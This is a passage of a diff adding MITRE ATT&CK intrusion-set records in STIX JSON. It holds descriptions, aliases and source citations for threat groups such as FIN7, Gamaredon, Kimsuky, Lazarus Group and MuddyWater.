+        "GOLD NIAGARA",
+        "ITG14",
+        "Carbon Spider"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "2.2",
+      "x_mitre_contributors": [
+        "Edward Millington"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--3753cc21-2dae-4dfb-8481-d004e74502cc",
+      "created": "2017-05-31T21:32:09.460Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0046",
+          "external_id": "G0046"
+        },
+        {
+          "source_name": "Carbon Spider",
+          "description": "(Citation: CrowdStrike Carbon Spider August 2021)"
+        },
+        {
+          "source_name": "FIN7",
+          "description": "(Citation: FireEye FIN7 March 2017) (Citation: FireEye FIN7 April 2017) (Citation: Morphisec FIN7 June 2017) (Citation: FireEye FIN7 Shim Databases) (Citation: FireEye FIN7 Aug 2018)"
+        },
+        {
+          "source_name": "GOLD NIAGARA",
+          "description": "(Citation: Secureworks GOLD NIAGARA Threat Profile)"
+        },
+        {
+          "source_name": "FireEye CARBANAK June 2017",
+          "description": "Bennett, J., Vengerik, B. (2017, June 12). Behind the CARBANAK Backdoor. Retrieved June 11, 2018.",
+          "url": "https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html"
+        },
+        {
+          "source_name": "FireEye FIN7 April 2017",
+          "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+          "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+        },
+        {
+          "source_name": "FireEye FIN7 Aug 2018",
+          "description": "Carr, N., et al. (2018, August 01). On the Hunt for FIN7: Pursuing an Enigmatic and Evasive Global Criminal Operation. Retrieved August 23, 2018.",
+          "url": "https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html"
+        },
+        {
+          "source_name": "Secureworks GOLD NIAGARA Threat Profile",
+          "description": "CTU. (n.d.). GOLD NIAGARA. Retrieved September 21, 2021.",
+          "url": "https://www.secureworks.com/research/threat-profiles/gold-niagara"
+        },
+        {
+          "source_name": "FireEye FIN7 Shim Databases",
+          "description": "Erickson, J., McWhirt, M., Palombo, D. (2017, May 3). To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence. Retrieved July 18, 2017.",
+          "url": "https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html"
+        },
+        {
+          "source_name": "Morphisec FIN7 June 2017",
+          "description": "Gorelik, M.. (2017, June 9). FIN7 Takes Another Bite at the Restaurant Industry. Retrieved July 13, 2017.",
+          "url": "http://blog.morphisec.com/fin7-attacks-restaurant-industry"
+        },
+        {
+          "source_name": "ITG14",
+          "description": "ITG14 shares campaign overlap with [FIN7](https://attack.mitre.org/groups/G0046).(Citation: IBM Ransomware Trends September 2020)"
+        },
+        {
+          "source_name": "CrowdStrike Carbon Spider August 2021",
+          "description": "Loui, E. and Reynolds, J. (2021, August 30). CARBON SPIDER Embraces Big Game Hunting, Part 1. Retrieved September 20, 2021.",
+          "url": "https://www.crowdstrike.com/blog/carbon-spider-embraces-big-game-hunting-part-1/"
+        },
+        {
+          "source_name": "FireEye FIN7 March 2017",
+          "description": "Miller, S., et al. (2017, March 7). FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings. Retrieved March 8, 2017.",
+          "url": "https://web.archive.org/web/20180808125108/https:/www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.html"
+        },
+        {
+          "source_name": "IBM Ransomware Trends September 2020",
+          "description": "Singleton, C. and Kiefer, C. (2020, September 28). Ransomware 2020: Attack Trends Affecting Organizations Worldwide. Retrieved September 20, 2021.",
+          "url": "https://securityintelligence.com/posts/ransomware-2020-attack-trends-new-techniques-affecting-organizations-worldwide/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack",
+        "ics-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-22T04:29:39.915Z",
+      "name": "Gamaredon Group",
+      "description": "[Gamaredon Group](https://attack.mitre.org/groups/G0047) is a suspected Russian cyber espionage threat group that has targeted military, NGO, judiciary, law enforcement, and non-profit organizations in Ukraine since at least 2013. The name [Gamaredon Group](https://attack.mitre.org/groups/G0047) comes from a misspelling of the word \"Armageddon\", which was detected in the adversary's early campaigns.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: Symantec Shuckworm January 2022)(Citation: Microsoft Actinium February 2022)\n\nIn November 2021, the Ukrainian government publicly attributed [Gamaredon Group](https://attack.mitre.org/groups/G0047) to Russia's Federal Security Service (FSB) Center 18.(Citation: Bleepingcomputer Gamardeon FSB November 2021)(Citation: Microsoft Actinium February 2022)",
+      "aliases": [
+        "Gamaredon Group",
+        "IRON TILDEN",
+        "Primitive Bear",
+        "ACTINIUM",
+        "Armageddon",
+        "Shuckworm",
+        "DEV-0157"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "2.1",
+      "x_mitre_contributors": [
+        "ESET",
+        "Trend Micro Incorporated"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--2e290bfe-93b5-48ce-97d6-edcd6d32b7cf",
+      "created": "2017-05-31T21:32:09.849Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0047",
+          "external_id": "G0047"
+        },
+        {
+          "source_name": "ACTINIUM",
+          "description": "(Citation: Microsoft Actinium February 2022)"
+        },
+        {
+          "source_name": "DEV-0157",
+          "description": "(Citation: Microsoft Actinium February 2022)"
+        },
+        {
+          "source_name": "Gamaredon Group",
+          "description": "(Citation: Palo Alto Gamaredon Feb 2017)"
+        },
+        {
+          "source_name": "IRON TILDEN",
+          "description": "(Citation: Secureworks IRON TILDEN Profile)"
+        },
+        {
+          "source_name": "Armageddon",
+          "description": "(Citation: Symantec Shuckworm January 2022)"
+        },
+        {
+          "source_name": "Shuckworm",
+          "description": "(Citation: Symantec Shuckworm January 2022)"
+        },
+        {
+          "source_name": "Primitive Bear",
+          "description": "(Citation: Unit 42 Gamaredon February 2022)"
+        },
+        {
+          "source_name": "ESET Gamaredon June 2020",
+          "description": "Boutin, J. (2020, June 11). Gamaredon group grows its game. Retrieved June 16, 2020.",
+          "url": "https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/"
+        },
+        {
+          "source_name": "TrendMicro Gamaredon April 2020",
+          "description": "Kakara, H., Maruyama, E. (2020, April 17). Gamaredon APT Group Use Covid-19 Lure in Campaigns. Retrieved May 19, 2020.",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/gamaredon-apt-group-use-covid-19-lure-in-campaigns/"
+        },
+        {
+          "source_name": "Palo Alto Gamaredon Feb 2017",
+          "description": "Kasza, A. and Reichel, D. (2017, February 27). The Gamaredon Group Toolset Evolution. Retrieved March 1, 2017.",
+          "url": "https://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/"
+        },
+        {
+          "source_name": "Microsoft Actinium February 2022",
+          "description": "Microsoft Threat Intelligence Center. (2022, February 4). ACTINIUM targets Ukrainian organizations. Retrieved February 18, 2022.",
+          "url": "https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations/"
+        },
+        {
+          "source_name": "Secureworks IRON TILDEN Profile",
+          "description": "Secureworks CTU. (n.d.). IRON TILDEN. Retrieved February 24, 2022.",
+          "url": "https://www.secureworks.com/research/threat-profiles/iron-tilden"
+        },
+        {
+          "source_name": "Symantec Shuckworm January 2022",
+          "description": "Symantec. (2022, January 31). Shuckworm Continues Cyber-Espionage Attacks Against Ukraine. Retrieved February 17, 2022.",
+          "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+        },
+        {
+          "source_name": "Bleepingcomputer Gamardeon FSB November 2021",
+          "description": "Toulas, B. (2018, November 4). Ukraine links members of Gamaredon hacker group to Russian FSB. Retrieved April 15, 2022.",
+          "url": "https://www.bleepingcomputer.com/news/security/ukraine-links-members-of-gamaredon-hacker-group-to-russian-fsb/"
+        },
+        {
+          "source_name": "Unit 42 Gamaredon February 2022",
+          "description": "Unit 42. (2022, February 3). Russia’s Gamaredon aka Primitive Bear APT Group Actively Targeting Ukraine. Retrieved February 21, 2022.",
+          "url": "https://unit42.paloaltonetworks.com/gamaredon-primitive-bear-ukraine-update-2021/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2021-10-12T23:21:06.480Z",
+      "name": "Inception",
+      "description": "[Inception](https://attack.mitre.org/groups/G0100) is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United States and throughout Europe, Asia, Africa, and the Middle East.(Citation: Unit 42 Inception November 2018)(Citation: Symantec Inception Framework March 2018)(Citation: Kaspersky Cloud Atlas December 2014)",
+      "aliases": [
+        "Inception",
+        "Inception Framework",
+        "Cloud Atlas"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_contributors": [
+        "Oleg Skulkin, Group-IB"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "intrusion-set--ead23196-d7b6-4ce6-a124-4ab4b67d81bd",
+      "type": "intrusion-set",
+      "created": "2020-05-08T17:01:04.058Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "G0100",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0100"
+        },
+        {
+          "source_name": "Inception",
+          "description": "(Citation: Symantec Inception Framework March 2018)"
+        },
+        {
+          "source_name": "Inception Framework",
+          "description": "(Citation: Symantec Inception Framework March 2018)"
+        },
+        {
+          "source_name": "Cloud Atlas",
+          "description": "(Citation: Kaspersky Cloud Atlas December 2014)"
+        },
+        {
+          "source_name": "Unit 42 Inception November 2018",
+          "url": "https://unit42.paloaltonetworks.com/unit42-inception-attackers-target-europe-year-old-office-vulnerability/",
+          "description": "Lancaster, T. (2018, November 5). Inception Attackers Target Europe with Year-old Office Vulnerability. Retrieved May 8, 2020."
+        },
+        {
+          "source_name": "Symantec Inception Framework March 2018",
+          "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/inception-framework-hiding-behind-proxies",
+          "description": "Symantec. (2018, March 14). Inception Framework: Alive and Well, and Hiding Behind Proxies. Retrieved May 8, 2020."
+        },
+        {
+          "source_name": "Kaspersky Cloud Atlas December 2014",
+          "url": "https://securelist.com/cloud-atlas-redoctober-apt-is-back-in-style/68083/",
+          "description": "GReAT. (2014, December 10). Cloud Atlas: RedOctober APT is back in style. Retrieved May 8, 2020."
+        }
+      ],
+      "x_mitre_version": "1.1",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2022-11-30T22:53:00.875Z",
+      "name": "Kimsuky",
+      "description": "[Kimsuky](https://attack.mitre.org/groups/G0094) is a North Korea-based cyber espionage group that has been active since at least 2012. The group initially focused on targeting South Korean government entities, think tanks, and individuals identified as experts in various fields, and expanded its operations to include the United States, Russia, Europe, and the UN. [Kimsuky](https://attack.mitre.org/groups/G0094) has focused its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions.(Citation: EST Kimsuky April 2019)(Citation: BRI Kimsuky April 2019)(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)(Citation: CISA AA20-301A Kimsuky)\n\n[Kimsuky](https://attack.mitre.org/groups/G0094) was assessed to be responsible for the 2014 Korea Hydro & Nuclear Power Co. compromise; other notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), and Operation Smoke Screen (2019).(Citation: Netscout Stolen Pencil Dec 2018)(Citation: EST Kimsuky SmokeScreen April 2019)(Citation: AhnLab Kimsuky Kabar Cobra Feb 2019)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.",
+      "aliases": [
+        "Kimsuky",
+        "STOLEN PENCIL",
+        "Thallium",
+        "Black Banshee",
+        "Velvet Chollima"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "3.1",
+      "x_mitre_contributors": [
+        "Taewoo Lee, KISA",
+        "Dongwook Kim, KISA"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--0ec2f388-bf0f-4b5c-97b1-fc736d26c25f",
+      "created": "2019-08-26T15:03:02.577Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0094",
+          "external_id": "G0094"
+        },
+        {
+          "source_name": "Thallium",
+          "description": "(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)"
+        },
+        {
+          "source_name": "Black Banshee",
+          "description": "(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)"
+        },
+        {
+          "source_name": "STOLEN PENCIL",
+          "description": "(Citation: Netscout Stolen Pencil Dec 2018)"
+        },
+        {
+          "source_name": "Kimsuky",
+          "description": "(Citation: Securelist Kimsuky Sept 2013)(Citation: Malwarebytes Kimsuky June 2021)"
+        },
+        {
+          "source_name": "Velvet Chollima",
+          "description": "(Citation: Zdnet Kimsuky Dec 2018)(Citation: ThreatConnect Kimsuky September 2020)(Citation: Malwarebytes Kimsuky June 2021)"
+        },
+        {
+          "source_name": "AhnLab Kimsuky Kabar Cobra Feb 2019",
+          "description": "AhnLab. (2019, February 28). Operation Kabar Cobra - Tenacious cyber-espionage campaign by Kimsuky Group. Retrieved September 29, 2021.",
+          "url": "https://global.ahnlab.com/global/upload/download/techreport/%5BAnalysis_Report%5DOperation%20Kabar%20Cobra.pdf"
+        },
+        {
+          "source_name": "EST Kimsuky April 2019",
+          "description": "Alyac. (2019, April 3). Kimsuky Organization Steals Operation Stealth Power. Retrieved August 13, 2019.",
+          "url": "https://blog.alyac.co.kr/2234"
+        },
+        {
+          "source_name": "Netscout Stolen Pencil Dec 2018",
+          "description": "ASERT team. (2018, December 5). STOLEN PENCIL Campaign Targets Academia. Retrieved February 5, 2019.",
+          "url": "https://asert.arbornetworks.com/stolen-pencil-campaign-targets-academia/"
+        },
+        {
+          "source_name": "BRI Kimsuky April 2019",
+          "description": "BRI. (2019, April). Kimsuky unveils APT campaign 'Smoke Screen' aimed at Korea and America. Retrieved October 7, 2019.",
+          "url": "https://brica.de/alerts/alert/public/1255063/kimsuky-unveils-apt-campaign-smoke-screen-aimed-at-korea-and-america/"
+        },
+        {
+          "source_name": "Zdnet Kimsuky Dec 2018",
+          "description": "Cimpanu, C.. (2018, December 5). Cyber-espionage group uses Chrome extension to infect victims. Retrieved August 26, 2019.",
+          "url": "https://www.zdnet.com/article/cyber-espionage-group-uses-chrome-extension-to-infect-victims/"
+        },
+        {
+          "source_name": "CISA AA20-301A Kimsuky",
+          "description": "CISA, FBI, CNMF. (2020, October 27). https://us-cert.cisa.gov/ncas/alerts/aa20-301a. Retrieved November 4, 2020.",
+          "url": "https://us-cert.cisa.gov/ncas/alerts/aa20-301a"
+        },
+        {
+          "source_name": "Cybereason Kimsuky November 2020",
+          "description": "Dahan, A. et al. (2020, November 2). Back to the Future: Inside the Kimsuky KGH Spyware Suite. Retrieved November 6, 2020.",
+          "url": "https://www.cybereason.com/blog/back-to-the-future-inside-the-kimsuky-kgh-spyware-suite"
+        },
+        {
+          "source_name": "EST Kimsuky SmokeScreen April 2019",
+          "description": "ESTSecurity. (2019, April 17). Analysis of the APT Campaign ‘Smoke Screen’ targeting to Korea and US  출처: https://blog.alyac.co.kr/2243 [이스트시큐리티 알약 블로그]. Retrieved September 29, 2021.",
+          "url": "https://blog.alyac.co.kr/attachment/cfile5.uf@99A0CD415CB67E210DCEB3.pdf"
+        },
+        {
+          "source_name": "Malwarebytes Kimsuky June 2021",
+          "description": "Jazi, H. (2021, June 1). Kimsuky APT continues to target South Korean government using AppleSeed backdoor. Retrieved June 10, 2021.",
+          "url": "https://blog.malwarebytes.com/threat-analysis/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/"
+        },
+        {
+          "source_name": "Securelist Kimsuky Sept 2013",
+          "description": "Tarakanov , D.. (2013, September 11). The “Kimsuky” Operation: A North Korean APT?. Retrieved August 13, 2019.",
+          "url": "https://securelist.com/the-kimsuky-operation-a-north-korean-apt/57915/"
+        },
+        {
+          "source_name": "ThreatConnect Kimsuky September 2020",
+          "description": "ThreatConnect. (2020, September 28). Kimsuky Phishing Operations Putting In Work. Retrieved October 30, 2020.",
+          "url": "https://threatconnect.com/blog/kimsuky-phishing-operations-putting-in-work/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-30T19:01:41.451Z",
+      "name": "Lazarus Group",
+      "description": "[Lazarus Group](https://attack.mitre.org/groups/G0032) is a North Korean state-sponsored cyber threat group that has been attributed to the Reconnaissance General Bureau.(Citation: US-CERT HIDDEN COBRA June 2017)(Citation: Treasury North Korean Cyber Groups September 2019) The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by [Lazarus Group](https://attack.mitre.org/groups/G0032) correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain. (Citation: Novetta Blockbuster)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups, such as [Andariel](https://attack.mitre.org/groups/G0138), [APT37](https://attack.mitre.org/groups/G0067), [APT38](https://attack.mitre.org/groups/G0082), and [Kimsuky](https://attack.mitre.org/groups/G0094).   ",
+      "aliases": [
+        "Lazarus Group",
+        "Labyrinth Chollima",
+        "HIDDEN COBRA",
+        "Guardians of Peace",
+        "ZINC",
+        "NICKEL ACADEMY"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "3.2",
+      "x_mitre_contributors": [
+        "Kyaw Pyiyt Htet, @KyawPyiytHtet",
+        "Dragos  Threat  Intelligence"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--c93fccb1-e8e8-42cf-ae33-2ad1d183913a",
+      "created": "2017-05-31T21:32:03.807Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0032",
+          "external_id": "G0032"
+        },
+        {
+          "source_name": "Labyrinth Chollima",
+          "description": "(Citation: CrowdStrike Labyrinth Chollima Feb 2022)"
+        },
+        {
+          "source_name": "ZINC",
+          "description": "(Citation: Microsoft ZINC disruption Dec 2017)"
+        },
+        {
+          "source_name": "Lazarus Group",
+          "description": "(Citation: Novetta Blockbuster)"
+        },
+        {
+          "source_name": "NICKEL ACADEMY",
+          "description": "(Citation: Secureworks NICKEL ACADEMY Dec 2017)"
+        },
+        {
+          "source_name": "Guardians of Peace",
+          "description": "(Citation: US-CERT HIDDEN COBRA June 2017)"
+        },
+        {
+          "source_name": "CrowdStrike Labyrinth Chollima Feb 2022",
+          "description": "CrowdStrike. (2022, February 1). CrowdStrike Adversary Labyrinth Chollima. Retrieved February 1, 2022.",
+          "url": "https://web.archive.org/web/20210723190317/https://adversary.crowdstrike.com/en-US/adversary/labyrinth-chollima/"
+        },
+        {
+          "source_name": "Novetta Blockbuster",
+          "description": "Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016.",
+          "url": "https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf"
+        },
+        {
+          "source_name": "Secureworks NICKEL ACADEMY Dec 2017",
+          "description": "Secureworks. (2017, December 15). Media Alert - Secureworks Discovers North Korean Cyber Threat Group, Lazarus, Spearphishing Financial Executives of Cryptocurrency Companies. Retrieved December 27, 2017.",
+          "url": "https://www.secureworks.com/about/press/media-alert-secureworks-discovers-north-korean-cyber-threat-group-lazarus-spearphishing"
+        },
+        {
+          "source_name": "Microsoft ZINC disruption Dec 2017",
+          "description": "Smith, B. (2017, December 19). Microsoft and Facebook disrupt ZINC malware attack to protect customers and the internet from ongoing cyberthreats. Retrieved December 20, 2017.",
+          "url": "https://blogs.microsoft.com/on-the-issues/2017/12/19/microsoft-facebook-disrupt-zinc-malware-attack-protect-customers-internet-ongoing-cyberthreats/"
+        },
+        {
+          "source_name": "HIDDEN COBRA",
+          "description": "The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA.(Citation: US-CERT HIDDEN COBRA June 2017)(Citation: US-CERT HOPLIGHT Apr 2019)"
+        },
+        {
+          "source_name": "Treasury North Korean Cyber Groups September 2019",
+          "description": "US Treasury . (2019, September 13). Treasury Sanctions North Korean State-Sponsored Malicious Cyber Groups. Retrieved September 29, 2021.",
+          "url": "https://home.treasury.gov/news/press-releases/sm774"
+        },
+        {
+          "source_name": "US-CERT HIDDEN COBRA June 2017",
+          "description": "US-CERT. (2017, June 13). Alert (TA17-164A) HIDDEN COBRA – North Korea’s DDoS Botnet Infrastructure. Retrieved July 13, 2017.",
+          "url": "https://www.us-cert.gov/ncas/alerts/TA17-164A"
+        },
+        {
+          "source_name": "US-CERT HOPLIGHT Apr 2019",
+          "description": "US-CERT. (2019, April 10). MAR-10135536-8 – North Korean Trojan: HOPLIGHT. Retrieved April 19, 2019.",
+          "url": "https://www.us-cert.gov/ncas/analysis-reports/AR19-100A"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack",
+        "ics-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-22T04:49:29.731Z",
+      "name": "LazyScripter",
+      "description": "[LazyScripter](https://attack.mitre.org/groups/G0140) is threat group that has mainly targeted the airlines industry since at least 2018, primarily using open-source toolsets.(Citation: MalwareBytes LazyScripter Feb 2021)",
+      "aliases": [
+        "LazyScripter"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "1.1",
+      "x_mitre_contributors": [
+        "Manikantan Srinivasan, NEC Corporation India",
+        "Pooja Natarajan, NEC Corporation India",
+        "Hiroki Nagahama, NEC Corporation"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--abc5a1d4-f0dc-49d1-88a1-4a80e478bb03",
+      "created": "2021-11-24T19:26:27.305Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0140",
+          "external_id": "G0140"
+        },
+        {
+          "source_name": "LazyScripter",
+          "description": "(Citation: MalwareBytes LazyScripter Feb 2021)"
+        },
+        {
+          "source_name": "MalwareBytes LazyScripter Feb 2021",
+          "description": "Jazi, H. (2021, February). LazyScripter: From Empire to double RAT. Retrieved November 24, 2021.",
+          "url": "https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-22T04:59:16.032Z",
+      "name": "MuddyWater",
+      "description": "[MuddyWater](https://attack.mitre.org/groups/G0069) is a cyber espionage group assessed to be a subordinate element within Iran's Ministry of Intelligence and Security (MOIS).(Citation: CYBERCOM Iranian Intel Cyber January 2022) Since at least 2017, [MuddyWater](https://attack.mitre.org/groups/G0069) has targeted a range of government and private organizations across sectors, including telecommunications, local government, defense, and oil and natural gas organizations, in the Middle East, Asia, Africa, Europe, and North America.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: Talos MuddyWater Jan 2022)",
+      "aliases": [
+        "MuddyWater",
+        "Earth Vetala",
+        "MERCURY",
+        "Static Kitten",
+        "Seedworm",
+        "TEMP.Zagros"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "4.1",
+      "x_mitre_contributors": [
+        "Ozer Sarilar, @ozersarilar, STM",
+        "Daniyal Naeem, BT Security"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2",
+      "created": "2018-04-18T17:59:24.739Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0069",
+          "external_id": "G0069"
+        },
+        {
+          "source_name": "MERCURY",
+          "description": "(Citation: Anomali Static Kitten February 2021)"
+        },
+        {
+          "source_name": "Static Kitten",
+          "description": "(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)"
+        },
+        {
+          "source_name": "TEMP.Zagros",
+          "description": "(Citation: FireEye MuddyWater Mar 2018)(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)"
+        },
+        {
+          "source_name": "Seedworm",
+          "description": "(Citation: Symantec MuddyWater Dec 2018)(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)"
+        },
+        {
+          "source_name": "Earth Vetala",
+          "description": "(Citation: Trend Micro Muddy Water March 2021)"
+        },
+        {
+          "source_name": "MuddyWater",
+          "description": "(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)"
+        },
+        {
+          "source_name": "ClearSky MuddyWater Nov 2018",
+          "description": "ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018.",
+          "url": "https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf"
+        },
+        {
+          "source_name": "ClearSky MuddyWater June 2019",
+          "description": "ClearSky. (2019, June). Iranian APT group ‘MuddyWater’ Adds Exploits to Their Arsenal. Retrieved May 14, 2020.",
+          "url": "https://www.clearskysec.com/wp-content/uploads/2019/06/Clearsky-Iranian-APT-group-%E2%80%98MuddyWater%E2%80%99-Adds-Exploits-to-Their-Arsenal.pdf"
+        },
+        {
+          "source_name": "CYBERCOM Iranian Intel Cyber January 2022",
+          "description": "Cyber National Mission Force. (2022, January 12). Iranian intel cyber suite of malware uses open source tools. Retrieved September 30, 2022.",
+          "url": "https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/"
+        },
+        {
+          "source_name": "DHS CISA AA22-055A MuddyWater February 2022",
+          "description": "FBI, CISA, CNMF, NCSC-UK. (2022, February 24). Iranian Government-Sponsored Actors Conduct Cyber Operations Against Global Government and Commercial Networks. Retrieved September 27, 2022.",
+          "url": "https://www.cisa.gov/uscert/ncas/alerts/aa22-055a"
+        },
+        {
+          "source_name": "Unit 42 MuddyWater Nov 2017",
+          "description": "Lancaster, T.. (2017, November 14). Muddying the Water: Targeted Attacks in the Middle East. Retrieved March 15, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/"
+        },
+        {
+          "source_name": "Talos MuddyWater Jan 2022",
+          "description": "Malhortra, A and Ventura, V. (2022, January 31). Iranian APT MuddyWater targets Turkish users via malicious PDFs, executables. Retrieved June 22, 2022.",
+          "url": "https://blog.talosintelligence.com/2022/01/iranian-apt-muddywater-targets-turkey.html"
+        },
+        {
+          "source_name": "Anomali Static Kitten February 2021",
